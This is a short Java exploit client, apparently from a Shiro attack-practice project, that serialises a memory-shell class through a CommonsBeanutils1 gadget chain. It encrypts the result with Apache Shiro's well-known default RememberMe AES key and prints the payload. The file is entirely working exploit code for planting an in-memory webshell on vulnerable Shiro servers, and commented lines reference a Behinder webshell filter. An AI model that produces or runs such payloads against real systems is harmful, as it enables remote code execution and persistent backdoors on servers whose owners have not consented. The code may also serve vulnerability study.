package com.govuln.shiroattack.memshell;

import com.govuln.shiroattack.CommonsBeanutils1Shiro;
import javassist.*;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

public class Client_memshell {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
//        CtClass clazz = pool.get(com.govuln.shiroattack.memshell.BehinderFilter.class.getName());
//        CtClass clazz = pool.get(com.govuln.shiroattack.memshell.MyClassLoader.class.getName());
        CtClass clazz = pool.get(com.govuln.shiroattack.memshell.ClassDataLoader.class.getName());

        byte[] payloads = new CommonsBeanutils1Shiro().getPayload(clazz.toBytecode());

        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }

}
